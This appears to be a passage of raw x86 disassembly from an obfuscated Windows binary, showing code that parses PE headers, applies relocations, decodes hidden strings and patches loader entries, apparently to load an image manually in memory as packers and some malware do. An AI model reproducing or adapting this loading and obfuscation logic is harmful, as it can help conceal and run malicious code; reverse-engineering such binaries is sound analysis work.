  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
